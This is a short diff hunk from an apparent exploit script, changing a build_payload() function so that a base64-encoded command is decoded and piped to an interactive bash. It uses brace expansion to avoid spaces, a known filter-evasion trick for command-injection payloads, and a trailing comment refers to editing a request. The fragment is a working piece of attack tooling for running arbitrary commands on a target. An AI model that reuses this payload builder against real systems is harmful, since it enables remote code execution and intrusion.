@@ -16,7 +16,7 @@ encode_command()
 
 build_payload()
 {
-  echo "bash -c {echo,$1}|base64 -d|bash"
+  echo "bash -c \"{echo,$1}|{base64,-d}|{bash,-i}\""
 }
 
 # Edit this request
